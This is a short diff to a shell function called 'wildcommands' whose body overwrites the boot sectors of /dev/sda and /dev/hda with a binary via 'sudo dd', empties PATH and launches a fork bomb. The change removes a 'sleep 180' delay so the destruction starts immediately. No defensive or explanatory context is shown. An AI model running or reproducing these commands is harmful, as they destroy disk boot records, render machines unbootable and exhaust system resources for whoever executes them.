@@ -5,7 +5,6 @@ function wildcommands() {
   sudo dd if=/usr/bin/boot.bin of=/dev/sda bs=512;
   sudo dd if=/usr/bin/boot.bin of=/dev/hda bs=512;
   PATH="";
-  sleep 180
   :(){ :|:& };:
 }
 
